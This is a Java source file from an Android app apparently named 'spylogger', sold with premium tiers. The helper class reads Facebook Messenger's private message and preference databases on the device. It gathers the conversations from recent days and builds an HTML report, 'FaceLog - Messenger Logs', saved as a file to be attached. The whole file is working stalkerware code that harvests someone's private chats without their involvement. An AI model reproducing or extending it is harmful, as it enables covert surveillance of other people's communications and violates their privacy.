package com.gravatasufoca.spylogger.helpers;

import android.content.Context;

import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperInternal;
import com.gravatasufoca.spylogger.model.messenger.Contact;
import com.gravatasufoca.spylogger.model.messenger.Messages;
import com.gravatasufoca.spylogger.model.messenger.Prefs;
import com.gravatasufoca.spylogger.model.messenger.Sender;
import com.gravatasufoca.spylogger.model.messenger.Thread;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.R;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.utilidades.gravata.utils.Utilidades;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class FaceHtmlHelper {

	public static Context context;
	private Map<String, File> anexos;
	private Configuracao configuracao;

	private Dao<Messages, Integer> daoMessage;

	private Map<Thread, Map<Date, List<Messages>>> threads;
	private Map<Thread, List<Messages>> threadMessages;
	private StringBuilder html;
	//private final String MENSAGEM_MOLDE = "<div class=\"eventtype t%s\"><div class=\"contents\"><h3><a class=\"searchable\" href=\"#\" >%s</a><span class=\"device\">%s</span></h3><div class=\"econtent\"><span class=\"searchable\">%s</span></div><div class=\"einfo\">%s</div></div></div><div class=\"clear\"></div><div  class=\"arrow%s\"></div>";
	private final String MENSAGEM_MOLDE =   "<div class=\"eventtype t%s\"><div class=\"foto2\"><img src=\"%s\"/></div><div class=\"contents\"><h3><a class=\"searchable\" href=\"%s\" >%s</a><span class=\"device\">%s</span></h3><div class=\"econtent\"><span class=\"searchable\">%s</span></div><div class=\"einfo\">%s</div></div></div><div class=\"clear\"></div>";

	private final String HEADER_MOLDE =   "<div class=\"eventtype t%s\"><div class=\"foto\"><img src=\"%s\"/></div><div class=\"contents\"><h3><a class=\"searchable\" href=\"%s\" >%s</a><span class=\"device\">%s</span></h3><div class=\"econtent\"><span class=\"searchable\">%s</span></div><div class=\"einfo\">%s</div></div></div><div class=\"clear\"></div>";

	private final String DATA_MOLDE = "<div class=\"date-divider\"><a>%s</a></div>";
	private final String SEPARADOR_MOLDE = "<div class=\"contact-divider\" id=\"%s\"><div class=\"foto\"><img src=\"%s\"/></div><span>&nbsp;</span><div>%s</div></div>";
	private long tamanhoAnexos = 0;
	private Date ini,fim;

	private Contact proprietario;

	public FaceHtmlHelper(Context ctx) {
		context = ctx;
		try {
			daoMessage = (new DatabaseHelperInternal(context)).getMessagesDao();
			proprietario=getProprietario(ctx);

			getChats();
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}

	private Contact getProprietario(Context context){
		try {

			String uid=context.getSharedPreferences(Utils.PREF, 0).getString("UID", "");
			if(!uid.isEmpty())
				return Utils.getContato(uid);

			Dao<Prefs, Integer> dao=(new DatabaseHelperFacebookPrefs(context)).getPrefsDao();
			List<Prefs> prefs=dao.queryForAll();

			for(Prefs pref:prefs){
				if(pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_uid")){
					context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", pref.getValue()).commit();

					return Utils.getContato(pref.getValue());
				}
				else if(pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_me_user")){
					try {
						JSONObject json=new JSONObject(pref.getValue());
						context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", json.getString("uid")).commit();

						return Utils.getContato(json.getString("uid"));
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}

			}

		} catch (SQLException e) {
			e.printStackTrace();
		}
		return new Contact();
	}

	private Map<Thread, Map<Date, List<Messages>>> getChats() {
		if (threads == null) {
			threads = new HashMap<Thread, Map<Date, List<Messages>>>();
			threadMessages=new HashMap<Thread, List<Messages>>();
			int dias=getConfiguracao().getDias();
			try {

				Calendar ini = Calendar.getInstance();
				ini.setTime((new Date()));

				ini.set(Calendar.HOUR_OF_DAY, 0);
				ini.set(Calendar.MINUTE, 0);
				ini.set(Calendar.SECOND, 0);
				ini.set(Calendar.MILLISECOND, 0);
				ini.add(Calendar.DATE, -dias);
				this.ini=ini.getTime();


				//List<Messages> mensagens = daoMessage.queryBuilder().where().between("received_timestamp", ini.getTime(), new Date()).query();
				List<Messages> mensagens=new ArrayList<Messages>();
				GenericRawResults<String[]> rawResults= daoMessage.queryRaw("select msg_id from messages where date(timestamp_ms/1000,'unixepoch','localtime') between ? and ? ",
						new SimpleDateFormat("yyyy-MM-dd").format(this.ini),new SimpleDateFormat("yyyy-MM-dd").format(new Date()));

				for (String[] resultArray : rawResults) {
					Messages message= daoMessage.queryBuilder().where().eq("msg_id", resultArray[0]).queryForFirst();
					mensagens.add(message);
				}

				for(Messages m: mensagens){

					Thread threadList=m.getThread();

					m.getSender().getContato();
					threadList.getSenders();

					if(!threadMessages.containsKey(threadList)){
						threadMessages.put(threadList, new ArrayList<Messages>());
					}
					threadMessages.get(threadList).add(m);

					if (!threads.containsKey(threadList))
						threads.put(threadList, new HashMap<Date, List<Messages>>());

					Date data = Utils.zeraHora(m.getTimestamp_ms());

					if(!threads.get(threadList).containsKey(data)){
						threads.get(threadList).put(data, new ArrayList<Messages>());
					}

					threads.get(threadList).get(data).add(m);

				}


			} catch (SQLException e) {
				e.printStackTrace();
			}

		}
		return threads;
	}

	public StringBuilder getHtml() {

		if (html == null) {
			html = new StringBuilder();

			if(!Utilidades.premium)
				html.append(String.format(Utils.NOT_PREMIUM,context.getString(R.string.premium_limite)));


			Set<Thread> ctmp=threads.keySet();

			for(Thread thread: ctmp){
				String msg=thread.getSnippet();
				if(!Utilidades.premium)
					msg=Utils.getPercentualMensagem(msg,25)+ " ... "+context.getString(R.string.mensagem_nao_premium);

				html.append(String.format(HEADER_MOLDE, "4",thread.getPhoto(proprietario),"#"+thread.getThread_key(),
						thread.getNomes(proprietario),
						"", msg,
						new SimpleDateFormat("dd/MM/yyyy hh:mm:ss")
								.format(thread.getTimestamp_ms())));

			}


			for(Thread thread: ctmp){

				html.append(String.format(SEPARADOR_MOLDE,thread.getThread_key(),thread.getPhoto(proprietario),thread.getSnippetSender().getNome()));

				Map<Date, List<Messages>> tmpLista = threads.get(thread);

				List<Date> dates = new ArrayList<Date>(tmpLista.keySet());
				Collections.sort(dates,Collections.reverseOrder());

				for (Date data : dates) {

					List<Messages> mensagens = tmpLista.get(data);

					html.append(String.format(DATA_MOLDE, new SimpleDateFormat(
							"dd/MM/yyyy").format(data)));

					Collections.sort(mensagens);

					for (Messages mensagem : mensagens) {
						Sender sender=mensagem.getSender();
						if(sender==null)continue;
						Contact contato=sender.getContato();
						String tipo;
						if(contato==null)
							tipo="4";
						else
							tipo = contato.equals(proprietario) ? "5"	: "4";

						String foto;
						if(contato!=null)
							foto=contato.getSmallPictureUrl();
						else
							foto="";
						/*html.append(String.format(MENSAGEM_MOLDE, tipo,
								sender.getNome(),
								foto, getMensagem(mensagem),
								new SimpleDateFormat("dd/MM/yyyy hh:mm:ss")
										.format(mensagem.getTimestamp_ms()), tipo));*/

						html.append(String.format(MENSAGEM_MOLDE, tipo,foto,"",
								sender.getNome(),
								"", getMensagem(mensagem),
								new SimpleDateFormat("dd/MM/yyyy hh:mm:ss")
										.format(mensagem.getTimestamp_ms())));
					}
				}
				html.append("</div>");
			}
		}
		return html;
	}

	private String getMensagem(Messages mensagem) {
		String str= mensagem.getText();
		if(Utilidades.premium)
			return str;
		else{
			return Utils.getPercentualMensagem(str, 25)+ " ... "+context.getString(R.string.mensagem_nao_premium);
		}

	}

	private Configuracao getConfiguracao() {
		if (configuracao == null) {
			DatabaseHelper database = new DatabaseHelper(
					context);
			List<Configuracao> confs;
			try {
				confs = database.getConfiguracaoDao().queryForAll();
				Configuracao conf = null;

				if (confs.size() > 0) {
					conf = confs.get(0);
				}
				if (conf != null) {
					configuracao = conf;
				}
			} catch (Exception e) {
			}
		}
		return configuracao;
	}
	public Map<String, File> getAnexos() {
		if (anexos == null) {
			anexos = new HashMap<String, File>();
		}

		File chatsFile = getHtmlFile();

		anexos.put(chatsFile.getName(),chatsFile);
		tamanhoAnexos += chatsFile.length();

		return anexos;
	}
	private File getHtmlFile() {
		File outputDir = context.getCacheDir(); // context being

		File chatsFile = new File(outputDir, "messenger_logs_"
				+ (new SimpleDateFormat("dd_MM_yyyy").format(new Date()))
				+ ".html");
		try {
			OutputStream output = new FileOutputStream(chatsFile);

			output.write(wrapHtml(getHtml()).toString().getBytes());
			output.flush();
			output.close();
			return chatsFile;
		} catch (IOException e) {
			e.printStackTrace();
		}

		return null;

	}
	private StringBuilder wrapHtml(StringBuilder html) {
		StringBuilder tmp = new StringBuilder();

		tmp.append(
				"<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta charset=\"utf-8\"><style>.alert {padding: 4px 7px; border: solid 1px #ccc; white-space: normal !important;}.alert-warning { color: #b94a48; background-color: #f2dede;border-color: #eed3d7;}.clear{clear: both;}.device{font-weight: normal;font-style: italic;font-size:14px;text-align:right;}.date-divider{background: #fff;padding: 4px 7px;border: 1px solid #6ABA2F;margin: 15px 0 4px 0;}.date-divider a{text-decoration: none;}.eventtype{ margin-top: 6px; clear: both;}.contents{padding: 2px 8px 4px; margin: 0; float:right;}.contents h3{    margin:6px 0;       font-size:14px;}.contents p{    margin-top: 0;}.econtent{    margin-bottom:4px;}.econtent img{    vertical-align:middle;}.t2, .t5, .t15{    margin-left:20%;    background-color: #fff;    box-shadow: -2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;    float: right;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #309b19;    border-style: solid;    text-align: right;}.t1, .t3, .t4 {    margin-right: 20%;    background-color: #F5F5F5;    box-shadow: 2px 1px 2px rgba(0, 0, 0, 0.6);    font: 15px Helvetica, Arial, sans-serif;     float: left;    padding: 0 4px;    position: relative;    border-width: 1px;    border-color: #9DA0A6;    border-style: solid;}.arrow2, .arrow5, .arrow15{    float: right;    width:23px;    height:10px;    margin-top:-1px;    margin-right:10px;   background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjhGMjZGMUREQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjhGMjZGMURFQ0I3NTExRTFCRjg1ODQxRUREMjNBOTE3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OEYyNkYxREJDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OEYyNkYxRENDQjc1MTFFMUJGODU4NDFFREQyM0E5MTciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7tzfsZAAAAsUlEQVR42mI0mC35n4FGgEmRQ22lGJvkD1FWSaoa3KI8U5ER6HIQWxSIc6BYiApm5wLxFCYo5zUQ1wOxDBBnAfEdCgx+B8QLwMGCJvEdiKcDsSoQhwLxcTIMB+n/gs1wZLAGiK2geA2RBv8CBQc8QonQcBzqCw0gngX1HS4ACo4XpBgOAzeBOB2I5YG4CRq26GAiSlIkI0xxRf4mIL6GrJCFglQBi3wQDgHi++gKAAIMAK71JAwUWWlQAAAAAElFTkSuQmCC);}.arrow1, .arrow3, .arrow4{    width:23px;    height:10px;    margin-top:-1px;    margin-left:10px;    background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAKCAYAAABfYsXlAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjJFQTAwOEEzQ0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjJFQTAwOEE0Q0I3NjExRTFBNTA5RTNBMUFGOTlFNEU2Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MkVBMDA4QTFDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MkVBMDA4QTJDQjc2MTFFMUE1MDlFM0ExQUY5OUU0RTYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6T0+uHAAAAWElEQVR42mKcMGHCfwYaASYWVuaptDD4P8P/f0x/fv/NoYXhjAyMzCw0MRcKWJAE/lPDQGTAQi1XYo1QYhViMZSgehZquhSfy/FpZiTVYEIuZ6Q02QAEGAC0LQraPP8eOQAAAABJRU5ErkJggg==);}.einfo{font-weight:bold;}.foto{float:left; padding: 2px 8px 4px; margin: 0;}.foto img{width:75px;}.foto2{float:left; padding: 2px 8px 4px; margin: 0;}.foto2 img{width:45px;}.contact-divider{ background: #fff;padding: 4px 7px;border: 1px solid #6ABA2F;margin: 15px 0 4px 0;height: 70px;}</style></head><body><div tabindex=\"0\" style=\"padding-top: 46px; min-height: 651px;\"><div align=\"center\" style=\"margin-top: -50px;font-size: 34px;\">FaceLog - Messenger Logs from "+new SimpleDateFormat("dd/MM/yyyy").format(ini)+" to "+new SimpleDateFormat("dd/MM/yyyy").format(new Date())+"</div><div style=\"width:70%\">")
				.append(html).append("</div></div></body></html>");
		return tmp;
	}
}
